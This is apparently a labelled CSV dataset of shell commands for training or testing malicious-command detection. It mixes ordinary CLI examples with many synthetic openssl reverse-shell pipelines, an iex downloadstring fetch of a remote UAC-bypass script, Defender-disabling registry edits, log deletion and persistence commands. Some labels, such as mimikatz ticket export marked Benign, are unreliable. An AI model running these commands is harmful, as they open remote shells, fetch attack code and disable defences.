command,label,original_label,mitre_id
mate-search-tool --start --named=string --path=path/to/directory --sortby=name|folder|size|type|date,Benign,Benign,Benign
file $(which foo),Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:445,Malicious,Synthetic,Synthetic
vainfo [-a|--all],Benign,Benign,Benign
timeout [-p|--preserve-status] 1s|1m|1h|1d|... command,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:143,Malicious,Synthetic,Synthetic
"find . -name ""AssemblyInfo.cs"" -print0 | xargs -0 git diff --",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:22,Malicious,Synthetic,Synthetic
gofmt -s -w source.go,Benign,Benign,Benign
tcsh -n path/to/script.tcsh,Benign,Benign,Benign
ifdata -e eth0,Benign,Benign,Benign
gnome-terminal --tab,Benign,Benign,Benign
"find $target -type f -iname ""*.txt""",Benign,Benign,Benign
dig stackoverflow.com,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:993,Malicious,Synthetic,Synthetic
"find /tmp/ -ctime -1 -name 'x*' -exec sh -c ' exec mv ""$@"" ~/play/' sh {} +",Benign,Benign,Benign
sudo extrace -u,Benign,Benign,Benign
"if ($ipAddr -like ""*,*"") {",Context_Dependent,Malicious,T1046
tcpdump --list-interfaces,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:80 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
create partition primary,Benign,Benign,Benign
skopeo delete docker://registry_hostname/image:tag,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8081,Malicious,Synthetic,Synthetic
Stop-Service -Name service_name -Force -Confirm,Benign,Benign,Benign
pipewire-pulse [-h|--help],Benign,Benign,Benign
opam upgrade,Benign,Benign,Benign
plesk version,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:5432 root@10.20.30.40,Context_Dependent,Synthetic,Synthetic
tasklist /fo table|list|csv,Benign,Benign,Benign
"find /var/www/ -type f -name ""*"" -size +100M -exec du -h '{}' \;|grep -v /download/",Benign,Benign,Benign
"""import os, subprocess; os.environ.get('CALC_SPAWNED') or (os.environ.update({'CALC_SPAWNED':'1'}) or subprocess.Popen(['calc.exe']))"" | Out-File -Encoding ASCII ""$SitePackages\atomic_hook.pth""",Malicious,Malicious,T1546
ssh -fN -L 8080:10.0.0.5:80 backup@10.10.10.10,Context_Dependent,Synthetic,Synthetic
cgclassify --sticky -g cpu:/student 1234,Benign,Benign,Benign
find /var/www/ -name wp-config.php -maxdepth 2,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:9002,Malicious,Synthetic,Synthetic
cupsreject -h server destination1 destination2 ...,Benign,Benign,Benign
netsh wlan connect name=SSID,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:445,Malicious,Synthetic,Synthetic
find -user takuya,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:143,Malicious,Synthetic,Synthetic
godot [-s|--script] script.gd,Benign,Benign,Benign
espeak -f path/to/file,Benign,Benign,Benign
soffice --convert-to pdf *.doc,Benign,Benign,Benign
ftp -a attacker.com,Malicious,Malicious,T1105
gpgconf [-L|--list-dirs],Benign,Benign,Benign
find . -type f -print0 | xargs -0 perl -pi -e 's/ +$//',Benign,Benign,Benign
glab [co|mr checkout] pr_number,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:9002,Malicious,Synthetic,Synthetic
progress [-w|--wait] [-c|--command] firefox,Benign,Benign,Benign
ssh -w 0:0 operator@10.0.0.5,Context_Dependent,Synthetic,Synthetic
kwallet-query kdewallet [-l|--list-entries],Benign,Benign,Benign
poetry env activate,Benign,Benign,Benign
b2 create_bucket bucket_name allPublic|allPrivate,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
vim-cmd hostsvc/enable_ssh,Malicious,Malicious,T1021
sudo btrfs [c|check] [-s|--super] n path/to/partition,Benign,Benign,Benign
"source ""$file""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
find . -size +100k -a -size -500k,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8081,Malicious,Synthetic,Synthetic
"find ""$source_dir"" -name ""*.$input_file_type"" -print0",Benign,Benign,Benign
"echo -e ""red\ngreen\nblue"" | dmenu > color.txt",Benign,Benign,Benign
unzip -O gbk path/to/archive1.zip path/to/archive2.zip ...,Benign,Benign,Benign
stat /etc/yum.conf,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8081,Malicious,Synthetic,Synthetic
telnet localhost port_number,Benign,Benign,Benign
"find . -name ""*.cpp"" | uncrustify -F - --replace",Benign,Benign,Benign
py-spy record [-o|--output] path/to/profile.svg [-p|--pid] pid,Benign,Benign,Benign
v watch run path/to/file.v,Benign,Benign,Benign
gnome-screenshot --version,Benign,Benign,Benign
git obliterate file_1 file_2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
git graft source_branch target_branch,Benign,Benign,Benign
tldr broot,Benign,Benign,Benign
dumpe2fs -h /dev/sdXN,Benign,Benign,Benign
gcloud compute instances list,Benign,Benign,Benign
sar -B 5,Benign,Benign,Benign
httpsvc,Malicious,Malicious,T1543
fileicon set path/to/file_or_directory path/to/icon_file.png,Benign,Benign,Benign
IOCTL_DISK_GET_DRIVE_GEOMETRY,Malicious,Malicious,T1680
tracepath -p 33434 host,Context_Dependent,Benign,Benign
"gocr -m 130 -p path/to/db_directory -i path/to/input_image.png -o path/to/output_file.txt -C ""0..9""",Benign,Benign,Benign
difft --ignore-comments path/to/file1 path/to/file2,Benign,Benign,Benign
yum --enablerepo=remi install php-mbstring,Benign,Benign,Benign
ffe --output=path/to/output [-c|--configuration] path/to/config.ffe path/to/input,Benign,Benign,Benign
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1'),Malicious,Malicious,T1548
openssl s_client -quiet -connect 192.168.1.10:995 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:3306 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
ocamlc -i path/to/source_file.ml,Benign,Benign,Benign
hsw-cli tx transaction_hash,Benign,Benign,Benign
buzzphrase,Benign,Benign,Benign
head -n1 $bigfile,Benign,Benign,Benign
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe},Malicious,Malicious,T1105
find \! -name . -type d -print0 | xargs -0 rmdir,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:110,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
tcpdump -i enp0s3 port 3306,Context_Dependent,Synthetic,Synthetic
aws logs delete-log-group --log-group-name $cloudwatch_log_group_name --region $region --output json,Malicious,Malicious,T1562
md-to-clip --help,Benign,Benign,Benign
exo compute block-storage list,Benign,Benign,Benign
tcpdump -i any -n -c 995,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:53 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:53 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
tcpdump -i eth0 -c 995,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
"wl-copy --paste-once ""text""",Benign,Benign,Benign
ps [-u|--user] $(id [-u|--user]) f,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
tcpdump -i any -n -c 8443,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:4444,Malicious,Synthetic,Synthetic
"dirbuster -e txt,html",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:443,Malicious,Synthetic,Synthetic
sudo haveged,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:4445,Malicious,Synthetic,Synthetic
find / -mtime +50 -mtime -100 | head,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4444,Malicious,Synthetic,Synthetic
tail -20 /etc/hostname,Context_Dependent,Synthetic,Synthetic
tcpdump -i eth0 dst 10.10.10.50,Context_Dependent,Synthetic,Synthetic
fvm releases,Benign,Benign,Benign
serialver -classpath path/to/directory classname1:classname2:...,Benign,Benign,Benign
laptop-detect,Benign,Benign,Benign
ssh -fN -L 8080:172.16.5.20:6379 operator@10.0.0.50,Context_Dependent,Synthetic,Synthetic
wfuzz -w path/to/file -p 127.0.0.1:8080:HTTP http://example.com/FUZZ,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.100:443 user@192.168.1.1,Context_Dependent,Synthetic,Synthetic
kubectl label [po|pods] key=value --all,Benign,Benign,Benign
"flarectl firewall rules create --zone=""example.com"" --value=""8.8.8.8"" --mode=""block"" --notes=""Block bad actor""",Benign,Benign,Benign
sudo ip [l|link] [s|set] ethX up|down,Benign,Benign,Benign
find . -type f -exec cp {} /tmp +,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:80 deploy@10.0.0.25,Context_Dependent,Synthetic,Synthetic
p7zip [-d|--decompress] [-k|--keep] compressed.ext.7z,Benign,Benign,Benign
uv publish --publish-url https://upload.pypi.org/legacy/,Benign,Benign,Benign
find ~ -name 'Foto*',Benign,Benign,Benign
"find . -name ""*bash*"" | xargs",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:9002,Malicious,Synthetic,Synthetic
find /usr/share/doc /usr/doc /usr/locale/doc -name instr.txt,Benign,Benign,Benign
cat numbers.txt,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9090,Malicious,Synthetic,Synthetic
hg remove [-S|--subrepos],Benign,Benign,Benign
sudo systemd-firstboot --force,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.8:80 admin@payload.c2,Context_Dependent,Synthetic,Synthetic
path/to/server_linux,Benign,Benign,Benign
split [-n|--number] 5 path/to/file,Benign,Benign,Benign
stat /etc/profile,Context_Dependent,Synthetic,Synthetic
rabbitmq-queues delete_member queue node,Benign,Benign,Benign
ssh -fN -L 8080:192.168.0.5:8443 root@10.10.10.50,Context_Dependent,Synthetic,Synthetic
"find /etc -name ""*.conf"" -printf ""%f accessed %AF %Ar, modified %TF %Tr\n""",Benign,Benign,Benign
"[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init '/;\nqx/'.\/init ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null",Malicious,Malicious,T1036
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:143,Malicious,Synthetic,Synthetic
gvgen -c 10,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:80 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
pulumi stack [hist|history] [-h|--help],Benign,Benign,Benign
satis build --repository-url repository_url satis.json path/to/output_directory,Benign,Benign,Benign
systemd-tty-ask-password-agent --watch,Benign,Benign,Benign
magick montage path/to/image1.jpg path/to/image2.jpg ... -geometry 640x480+0+0 path/to/montage.jpg,Benign,Benign,Benign
tcpdump -i eth0 src 192.168.1.1,Context_Dependent,Synthetic,Synthetic
plantuml -nometadata diagram.png > diagram.puml,Benign,Benign,Benign
"find $DIR -type f -name '*.html' -exec sed -i 's/.*<script type=""text\/javascript"" charset=""utf-8"" src=""file.js""><\/script>.*/<script type=""text\/javascript"" charset=""utf-8"" src=""file2.js""><\/script>/g' {} \;",Benign,Benign,Benign
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" \\$target -accepteula -s ""cmd.exe""",Malicious,Malicious,T1053
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8081,Malicious,Synthetic,Synthetic
wait4x tcp localhost:8080 --invert-check,Benign,Benign,Benign
prqlc compile,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.10:80 admin@172.20.10.8,Context_Dependent,Synthetic,Synthetic
ssh -i ~/path/mykeypair.pem ubuntu@ec2-XX-XXX-XXX-XXX.us-west-2.compute.amazonaws.com,Benign,Benign,Benign
tail -50 /var/log/nginx/access.log,Context_Dependent,Synthetic,Synthetic
quser.exe,Context_Dependent,Malicious,T1049
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9002,Malicious,Synthetic,Synthetic
gprof path/to/binary path/to/gmon.out,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9001,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
do_vslist,Context_Dependent,Malicious,T1083
dzdo -s,Benign,Benign,Benign
spicetify,Benign,Benign,Benign
bosh [-e|--environment] environment vms [-d|--deployment] deployment,Benign,Benign,Benign
awww kill,Benign,Benign,Benign
fortune | cowsay | lolcat,Benign,Benign,Benign
%SYSTEM32%,Malicious,Malicious,T1055
write-warning $cred.GetNetworkCredential().Password,Malicious,Malicious,T1056
stat /etc/crontab,Context_Dependent,Synthetic,Synthetic
sudo tune2fs -L 'MY_LABEL' /dev/sdXN,Benign,Benign,Benign
zed --diff path/to/old_file path/to/new_file,Benign,Benign,Benign
mocp path/to/directory,Benign,Benign,Benign
svccfg import path/to/smf_file.xml,Benign,Benign,Benign
find /var/www,Benign,Benign,Benign
osascript path/to/apple.scpt,Benign,Benign,Benign
"eyeD3 [-A|--album] ""Album Name"" *.mp3",Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:9090 user@10.0.0.8,Context_Dependent,Synthetic,Synthetic
"find /home/you -iname ""*.mp3"" -daystart -type f -mtime 1",Context_Dependent,Benign,Benign
Filter = [Ref] $Filter;,Malicious,Malicious,T1546
find /path ! -perm /022,Benign,Benign,Benign
"find . -maxdepth 1 -empty -not -name "".*""",Benign,Benign,Benign
.vgz,Malicious,Malicious,T1505
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9001,Malicious,Synthetic,Synthetic
mongodump [-o|--out] path/to/directory,Benign,Benign,Benign
gnatmake source_file1.adb source_file2.adb ...,Benign,Benign,Benign
pdftk path/to/input.pdf cat 1-2 3east 4-end output path/to/output.pdf,Benign,Benign,Benign
"tar -cf path/to/compressed_file.tar.bz2 [-I|--use-compress-program] ""pbzip2 -option1 -option2 ..."" path/to/file",Benign,Benign,Benign
"skate delete ""key""",Benign,Benign,Benign
sudo rc-update [-a|--all] [del|delete] service_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
mdatopbm path/to/image.mda > path/to/output.pbm,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8081,Malicious,Synthetic,Synthetic
find src/ -type d -exec mkdir -p dest/{} \; -o -type f -exec touch dest/{} \;,Benign,Benign,Benign
net time \\$computer_name,Malicious,Malicious,T1124
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:995,Malicious,Synthetic,Synthetic
dconf read /path/to/key,Benign,Benign,Benign
choco pack path\to\specification_file --version version,Benign,Benign,Benign
conda package [-w|--which] path/to/file,Benign,Benign,Benign
palmtopnm path/to/file.palm > path/to/file.pnm,Benign,Benign,Benign
find . -type f -print0 | xargs -0 -n1 -P4 bzip2,Benign,Benign,Benign
find . -name file* -maxdepth 1 -exec rm {} \;,Benign,Benign,Benign
Evil.txt.exe,Malicious,Malicious,T1036
cliphist list,Benign,Benign,Benign
egrep '(aeiou)+' path/to/file,Benign,Benign,Benign
cat report.txt | grep -i error,Benign,Benign,Benign
pycodestyle --first file.py,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:3306,Malicious,Synthetic,Synthetic
DYLD_LIBRARY_PATH,Malicious,Malicious,T1574
picom-trans [-n|--name] Firefox [-o|--opacity] percentage,Benign,Benign,Benign
cd .\tmp\victim-files,Malicious,Malicious,T1560
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:4445,Malicious,Synthetic,Synthetic
yara [-p|--threads] number_of_threads path/to/rule.yar path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:53,Malicious,Synthetic,Synthetic
sudo unshadow /etc/passwd /etc/shadow,Benign,Benign,Benign
aws ce create-anomaly-subscription --subscription subscription_name --monitor-arn monitor_arn --subscribers subscribers,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
xmake [b|build] [r|run],Benign,Benign,Benign
ssh -fN -L 8080:10.20.30.40:80 postgres@192.168.1.254,Context_Dependent,Synthetic,Synthetic
find test -empty,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.10:443 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:80,Malicious,Synthetic,Synthetic
k9s --readonly --cluster cluster_name,Benign,Benign,Benign
softwareupdate --install --all,Benign,Benign,Benign
aws sqs delete-message --queue-url https://queue_url --receipt-handle receipt_handle,Benign,Benign,Benign
tcpdump -i ens33 -c 4444,Context_Dependent,Synthetic,Synthetic
find . \( -name D -prune \) -o -name hi.dat,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.5.20:4445,Malicious,Synthetic,Synthetic
theHarvester -d support.internal -b google,Context_Dependent,Synthetic,Synthetic
apachectl -h,Benign,Benign,Benign
putty -help,Benign,Benign,Benign
"mimikatz ""kerberos::list /export""",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:993 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
watchman trigger-del path/to/watched_directory trigger_name,Benign,Benign,Benign
xar -cf archive.xar path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:1433 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:3389,Malicious,Synthetic,Synthetic
gcpdiag lint --project gcp_project_id,Benign,Benign,Benign
find . | xargs -I'{}' mv '{}' ~/play/,Benign,Benign,Benign
debtap [-q|--quiet] path/to/package.deb,Benign,Benign,Benign
chown -R tomcat7:tomcat7 webapps temp logs work conf,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8888,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4444,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.1.254:8080 audit@internal.corp,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8443 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:9002,Malicious,Synthetic,Synthetic
ssh -w 0:0 operator@10.0.0.8,Context_Dependent,Synthetic,Synthetic
git show-branch [-r|--remotes],Benign,Benign,Benign
"find /the/path -depth -type f -name ""*.abc"" -exec sh -c 'mv ""$1"" ""$(dirname ""$1"")/$(basename ""$1"" .abc).edefg""' _ {} \;",Benign,Benign,Benign
find dir1 ! -type d |xargs wc -c |tail -1,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:80,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.5:110 deploy@10.0.0.1,Context_Dependent,Synthetic,Synthetic
find / -name composer.json -exec grep -n drush {} /dev/null \;,Context_Dependent,Benign,Benign
massdns [-r|--resolvers] path/to/resolvers.txt [-o|--output] S path/to/domains.txt,Benign,Benign,Benign
tracepath 10.20.30.40,Context_Dependent,Synthetic,Synthetic
cat /dir/file.txt | wc -l,Benign,Benign,Benign
oldchecks -noninteractive -consoleoutput,Context_Dependent,Malicious,T1082
"git blame -L '/text/',+10 path/to/file",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:80,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:8443,Malicious,Synthetic,Synthetic
find . -name '*.png' | grep -f <(sed s?^?/[0-9]_[0-9]_[0-9]_? search.txt),Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
nslookup myip.opendns.comresolver1.opendns.com\r\n,Context_Dependent,Malicious,T1016
traceroute -n 172.16.0.10,Context_Dependent,Synthetic,Synthetic
ifconfig eth0 | grep inet | cut -d: -f2 | cut -d' ' -f1,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:22,Malicious,Synthetic,Synthetic
acme.sh --issue --dns dns_namesilo --domain example.com --domain *.example.com,Benign,Benign,Benign
datashader_cli points path/to/input_data.geo.parquet path/to/output_data.png --geo true,Benign,Benign,Benign
nest start,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:9002,Malicious,Synthetic,Synthetic
ln -s /bin/sh git-x,Malicious,Malicious,T1059
sudo -l -U admin,Context_Dependent,Synthetic,Synthetic
unset array[`shuf -i 0-3 -n1`],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
apptainer test [-C|--containall] path/to/image.sif,Benign,Benign,Benign
systemctl list-machines,Benign,Benign,Benign
tcpdump -i eth0 src 192.168.1.254,Context_Dependent,Synthetic,Synthetic
minikube start --driver virtualbox,Benign,Benign,Benign
"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""1"" /f >NUL 2>nul",Malicious,Malicious,T1562
ssh -fN -L 8080:10.0.0.5:80 svcuser@10.0.0.25,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.100:8888 operator@10.20.30.40,Context_Dependent,Synthetic,Synthetic
CloseServiceHandle(),Malicious,Malicious,T1489
keybase follow username,Benign,Benign,Benign
lsd [-F|--classify],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9090 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:9002,Malicious,Synthetic,Synthetic
xml2man path/to/service_file.mxml path/to/service_file.7,Benign,Benign,Benign
